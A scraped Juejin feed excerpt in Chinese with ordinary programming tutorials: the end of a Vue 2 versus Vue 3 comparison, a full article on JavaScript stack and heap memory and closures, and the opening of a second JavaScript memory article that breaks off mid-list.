<table><thead><tr><th>特性</th><th><strong>Vue 2</strong></th><th><strong>Vue 3</strong></th></tr></thead><tbody><tr><td><strong>响应式底层</strong></td><td><code>Object.defineProperty</code></td><td><code>Proxy</code></td></tr><tr><td><strong>检测能力</strong></td><td>无法检测属性增删、数组索引修改</td><td><strong>完全支持</strong></td></tr><tr><td><strong>初始化性能</strong></td><td><strong>递归</strong>遍历所有属性（慢、内存高）</td><td><strong>懒代理</strong>，访问时才转换（快）</td></tr><tr><td><strong>代码组织</strong></td><td><strong>Options API</strong> (data, methods 分离)</td><td><strong>Composition API</strong> (逻辑关注点聚合)</td></tr><tr><td><strong>Diff 算法</strong></td><td>全量双端比较，静态节点也要比</td><td><strong>静态标记 + Block Tree</strong>，只比动态节点</td></tr><tr><td><strong>TypeScript</strong></td><td>支持较弱，类型推断困难</td><td><strong>核心由 TS 编写</strong>，TS 支持极其友好</td></tr><tr><td><strong>体积</strong></td><td>较大，难以 Tree-shaking</td><td>模块化拆分，支持 <strong>Tree-shaking</strong>，体积更小</td></tr><tr><td><strong>Fragment</strong></td><td>组件只能有一个根节点</td><td>支持多根节点 (Fragment)</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-9">五、 为什么 Vue 3 要做这些升级？</h3>
<p>尤雨溪和团队进行 Vue 3 重构主要为了解决 Vue 2 的三个核心瓶颈：</p>
<h4 data-id="heading-10">1. 性能瓶颈 (Performance)</h4>
<p>Vue 2 的响应式初始化是递归的，对于大数据量的表格或列表，启动非常慢。且 Diff 算法在大型复杂组件中，无谓的静态节点对比消耗了大量 CPU。<br/>
<strong>Vue 3 通过 Proxy 和编译优化（静态标记），实现了“按需响应”和“靶向更新”，性能大幅提升。</strong></p>
<h4 data-id="heading-11">2. 代码组织与复用瓶颈 (Scalability)</h4>
<p>在 Vue 2 的 Options API 中，一个功能的逻辑被拆分到 <code>data</code>, <code>methods</code>, <code>watch</code> 里。当组件变得巨大（几千行代码）时，维护代码需要在文件里上下反复横跳（Jumping）。且 <code>Mixin</code> 代码复用存在命名冲突和来源不清晰的问题。<br/>
<strong>Vue 3 引入 Composition API (组合式 API)</strong> ，允许开发者按“逻辑功能”组织代码，完美解决了大型项目的维护难题，Hooks 更是取代了 Mixin。</p>
<h4 data-id="heading-12">3. TypeScript 支持 (Developer Experience)</h4>
<p>Vue 2 的源码是 JS 写的，通过 Flow 做类型检查，对 TS 的支持是后期补丁（<code>this</code> 指向在 TS 中很难推断）。随着前端工程化对 TS 需求的爆发，Vue 2 显得力不从心。<br/>
<strong>Vue 3 使用 TypeScript 重写</strong>，提供了原生的、极佳的类型推断体验。</p>
<h3 data-id="heading-13">总结</h3>
<ul>
<li><strong>原理层面</strong>：Vue 2 是劫持 setter/getter，Vue 3 是代理整个对象。</li>
<li><strong>更新机制</strong>：Vue 2 是全量树对比，Vue 3 是基于静态标记的动态节点追踪。</li>
<li><strong>目的</strong>：Vue 3 的升级是为了<strong>更快（性能）、更小（体积）、更易维护（组合式 API）以及更好的 TS 支持</strong>。</li>
</ul>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 内存机制与闭包解析]]></title>    <link>https://juejin.cn/post/7581828086019702799</link>    <guid>https://juejin.cn/post/7581828086019702799</guid>    <pubDate>2025-12-10T04:22:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581828086019702799" data-draft-id="7581844141668237352" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 内存机制与闭包解析"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T04:22:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冻梨政哥"/> <meta itemprop="url" content="https://juejin.cn/user/2373184444182659"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 内存机制与闭包解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2373184444182659/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冻梨政哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T04:22:43.000Z" title="Wed Dec 10 2025 04:22:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript 内存机制与闭包解析</h2>
<p>JavaScript 作为一门动态弱类型语言，其内存管理机制和闭包特性是理解 JS 运行原理的核心。本文将结合具体代码示例，深入解析 JS 的内存机制以及闭包的工作原理。</p>
<h3 data-id="heading-1">一、JavaScript 内存空间划分</h3>
<p>JavaScript 的内存空间主要分为三大类：</p>
<ol>
<li><strong>代码空间</strong>：用于存储执行的代码</li>
<li><strong>栈内存</strong>：主要存储简单数据类型和引用类型的地址</li>
<li><strong>堆内存</strong>：主要存储复杂数据类型（对象等）</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43bc3bb3a2fa4113b38cda4dd809054b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo5pS_5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765945363&amp;x-signature=GVf4kfg9L%2BPoAIEESnAycUnHzHU%3D" alt="2bad8a6ec6a17f7a384612ea3e0cbdcd.png" loading="lazy"/>
栈内存的特点是操作<strong>速度快、大小固定、存储连续，适合存储体积小</strong>的数据；而堆内存<strong>空间大，可存储大型复杂</strong>对象，但分配和回收内存相对耗时。</p>
<h3 data-id="heading-2">二、数据类型的内存存储</h3>
<h4 data-id="heading-3">1. 简单数据类型的存储</h4>
<p>简单数据类型（如数字、字符串、布尔值等）直接存储在栈内存中，赋值时会进行值拷贝：</p>
<pre><code class="hljs language-ini" lang="ini">// 调用栈在栈内存中
// 体积小
function foo() {
    var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">; // 赋值，直接存储在栈内存</span>
    var <span class="hljs-attr">b</span> = a<span class="hljs-comment">; // 拷贝，在栈内存中创建新值</span>
    <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
    console.log(a)<span class="hljs-comment">; // 2</span>
    console.log(b)<span class="hljs-comment">; // 1</span>
}
foo()<span class="hljs-comment">;</span>
</code></pre>
<p>上述代码中，<code>a</code>和<code>b</code>是相互独立的变量，修改<code>a</code>的值不会影响<code>b</code>，因为它们在栈内存中占据不同的空间。</p>
<h4 data-id="heading-4">2. 复杂数据类型的存储</h4>
<p>复杂数据类型（如对象）在栈内存中存储的是指向堆内存的地址，赋值时进行的是引用拷贝：</p>
<pre><code class="hljs language-css" lang="css">function foo() {
    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = {name:<span class="hljs-string">"极客时间"</span>}; // 栈内存存储地址，堆内存存储对象
    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span>; // 引用式拷贝，<span class="hljs-selector-tag">b</span>与<span class="hljs-selector-tag">a</span>指向堆中同一个对象
    <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.name</span> = "极客邦";
    console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">a</span>); // {name: <span class="hljs-string">"极客邦"</span>}
    console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">b</span>); // {name: <span class="hljs-string">"极客邦"</span>}
}
foo();
</code></pre>
<p>这里<code>a</code>和<code>b</code>在栈内存中存储的是同一个地址，指向堆内存中的同一个对象，因此修改<code>a</code>的属性会影响<code>b</code>。</p>
<h3 data-id="heading-5">三、JavaScript 的动态弱类型特性</h3>
<p>JS 作为动态弱类型语言，变量的类型可以在运行过程中动态改变，不需要预先声明类型：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JS 是动态弱类型语言</span>
<span class="hljs-keyword">var</span> bar; 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> bar); <span class="hljs-comment">// undefined</span>
bar = <span class="hljs-number">12</span>; <span class="hljs-comment">// 变为number类型</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> bar); <span class="hljs-comment">// number</span>
bar = <span class="hljs-string">'极客时间'</span>; <span class="hljs-comment">// 变为string类型</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> bar); <span class="hljs-comment">// string</span>
bar = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 变为boolean类型</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> bar); <span class="hljs-comment">// boolean</span>
bar = <span class="hljs-literal">null</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> bar);  <span class="hljs-comment">// Object (JS设计的bug)</span>
bar = {<span class="hljs-attr">name</span>:<span class="hljs-string">'极客时间'</span>}  <span class="hljs-comment">// 变为Object类型</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> bar); <span class="hljs-comment">// Object</span>
</code></pre>
<h3 data-id="heading-6">四、执行上下文与调用栈</h3>
<p>JavaScript 引擎通过调用栈来管理执行上下文，每个函数执行时都会创建一个执行上下文，包含：</p>
<ul>
<li>变量环境</li>
<li>词法环境</li>
<li>outer（词法作用域链）</li>
<li>this</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d628b31baa9f404794e21cbae0b31564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo5pS_5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765945363&amp;x-signature=gkmEdLnklEdWV75SPHcfRVrVH8k%3D" alt="lQLPJw1WF0yif-fNAhTNBHawwsioxubOAzAJEmTtM6BTAA_1142_532.png" loading="lazy"/>
执行上下文的切换通过调整调用栈的栈顶指针来实现，这也是栈内存需要高效操作的原因。</p>
<h3 data-id="heading-7">五、闭包的内存机制</h3>
<p>闭包是指内部函数可以访问外部函数作用域中变量的特性，其实现依赖于特殊的内存管理机制。</p>
<h4 data-id="heading-8">闭包示例解析</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> myName = <span class="hljs-string">"极客时间"</span>
    <span class="hljs-keyword">let</span> test1 = <span class="hljs-number">1</span>
    <span class="hljs-keyword">const</span> test2 = <span class="hljs-number">2</span>
    <span class="hljs-keyword">var</span> innerBar = { 
        <span class="hljs-attr">setName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">newName</span>){
            myName = newName
        },
        <span class="hljs-attr">getName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(test1)
            <span class="hljs-keyword">return</span> myName
        }
    }
    <span class="hljs-keyword">return</span> innerBar
}
<span class="hljs-keyword">var</span> bar = <span class="hljs-title function_">foo</span>()
bar.<span class="hljs-title function_">setName</span>(<span class="hljs-string">"极客邦"</span>)
bar.<span class="hljs-title function_">getName</span>() <span class="hljs-comment">// 输出1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bar.<span class="hljs-title function_">getName</span>()) <span class="hljs-comment">// 输出1和"极客邦"</span>
</code></pre>
<h4 data-id="heading-9">闭包的内存工作原理</h4>
<ol>
<li><strong>编译阶段</strong>：JS 引擎编译<code>foo</code>函数时，会扫描内部函数（<code>setName</code>和<code>getName</code>）</li>
<li><strong>识别闭包</strong>：发现内部函数引用了外部函数的变量（<code>myName</code>和<code>test1</code>），判断形成闭包</li>
<li><strong>创建闭包对象</strong>：在堆内存中创建一个<code>closure(foo)</code>对象，用于保存被内部函数引用的外部变量</li>
<li><strong>维持引用</strong>：当<code>foo</code>函数执行完毕后，虽然其执行上下文出栈，但由于<code>bar</code>仍引用着内部函数，而内部函数又引用着<code>closure(foo)</code>，所以这些变量不会被回收</li>
<li><strong>访问变量</strong>：内部函数通过引用<code>closure(foo)</code>来访问外部函数的变量</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09533f21e0344f518906acf66473d02d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya75qKo5pS_5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765945363&amp;x-signature=GfZMfMW%2FR%2FdDLzIvsBU4%2FC%2BqP4I%3D" alt="lQLPKGXzE8qWf4fNAjTNBHawul-TTHmpmmMJEm9r57TIAA_1142_564.png" loading="lazy"/></p>
<h3 data-id="heading-10">六、内存管理的特点</h3>
<ul>
<li>JavaScript 不需要手动管理内存（不同于 C/C++ 需要使用<code>malloc</code>和<code>free</code>）</li>
<li>栈内存的回收通过调整栈指针实现，效率高</li>
<li>堆内存的回收通过垃圾回收机制实现，当对象没有任何引用时会被回收</li>
<li>闭包会延长变量的生命周期，可能导致内存占用增加，需要合理使用</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 内存机制深度解析：从执行上下文到闭包的内存视角]]></title>    <link>https://juejin.cn/post/7581786379804114979</link>    <guid>https://juejin.cn/post/7581786379804114979</guid>    <pubDate>2025-12-10T04:21:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581786379804114979" data-draft-id="7581844141668302888" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 内存机制深度解析：从执行上下文到闭包的内存视角"/> <meta itemprop="keywords" content="前端,JavaScript,操作系统"/> <meta itemprop="datePublished" content="2025-12-10T04:21:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wwwwW"/> <meta itemprop="url" content="https://juejin.cn/user/631558156323657"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 内存机制深度解析：从执行上下文到闭包的内存视角
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/631558156323657/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wwwwW
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T04:21:22.000Z" title="Wed Dec 10 2025 04:21:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript 内存机制深度解析：从执行上下文到闭包的内存视角</h2>
<p>JavaScript 作为一门广泛应用于 Web 开发的动态弱类型语言，其运行机制与内存管理方式对开发者理解程序行为、优化性能以及避免内存泄漏至关重要。本文将从 JavaScript 的执行机制出发，深入剖析其内存模型——包括栈内存与堆内存的分工协作，并结合闭包这一核心特性，揭示 JavaScript 引擎（如 V8）如何高效管理内存。</p>
<hr/>
<h3 data-id="heading-1">一、JavaScript 是什么语言？</h3>
<p>JavaScript 是一门<strong>动态弱类型语言</strong>。所谓“动态”，意味着变量的数据类型在运行时才确定，无需在声明时指定；而“弱类型”则表示不同类型之间可以自动转换（例如 <code>"5" + 3</code> 得到 <code>"53"</code>）。这与 C/C++ 等静态强类型语言形成鲜明对比。</p>
<p>更重要的是，JavaScript <strong>不需要开发者直接操作内存</strong>。在 C/C++ 中，程序员需手动调用 <code>malloc</code> 分配内存、<code>free</code> 释放内存；而在 JavaScript 中，内存的分配与回收完全由引擎自动管理，开发者只需关注逻辑本身。</p>
<hr/>
<h3 data-id="heading-2">二、JavaScript 的八种数据类型与内存分类</h3>
<p>ECMAScript 标准定义了八种数据类型：</p>
<ul>
<li><strong>七种原始类型（简单数据类型）</strong> ：<code>undefined</code>、<code>null</code>、<code>boolean</code>、<code>number</code>、<code>bigint</code>、<code>string</code>、<code>symbol</code></li>
<li><strong>一种引用类型（复杂数据类型）</strong> ：<code>Object</code>（包括数组、函数、日期等）</li>
</ul>
<p>这些类型在内存中的存储方式截然不同：</p>
<ul>
<li><strong>简单数据类型</strong>：存储在<strong>栈内存</strong>中，值直接保存，访问速度快。</li>
<li><strong>复杂数据类型</strong>：实际对象存储在<strong>堆内存</strong>中，栈中仅保存指向堆中对象的<strong>引用地址</strong>（指针）。</li>
</ul>
<p>为何要这样设计？关键在于<strong>效率与灵活性的平衡</strong>。</p>
<hr/>
<h3 data-id="heading-3">三、内存空间的划分：代码空间、栈内存与堆内存</h3>
<p>当 JavaScript 代码从硬盘加载到内存中执行时，会涉及三种主要内存区域：</p>
<h4 data-id="heading-4">1. 代码空间</h4>
<p>存放编译后的字节码或机器码，供引擎执行。</p>
<h4 data-id="heading-5">2. 栈内存（Stack）</h4>
<ul>
<li>用于维护<strong>调用栈（Call Stack）</strong> ，是 JavaScript 执行机制的核心。</li>
<li>特点：<strong>连续、固定大小、分配/释放极快</strong>。</li>
<li>存放内容：<strong>执行上下文（Execution Context）</strong> ，包括变量环境（Variable Environment）、词法环境（Lexical Environment）、<code>this</code> 绑定等。</li>
<li>由于函数调用频繁，上下文切换必须高效。若将大对象也放入栈中，会导致栈帧过大、不连续，严重影响性能。</li>
</ul>
<h4 data-id="heading-6">3. 堆内存（Heap）</h4>
<ul>
<li>用于存储<strong>动态分配的对象</strong>，如对象、数组、函数等。</li>
<li>特点：<strong>空间大、不连续、分配和回收较慢</strong>。</li>
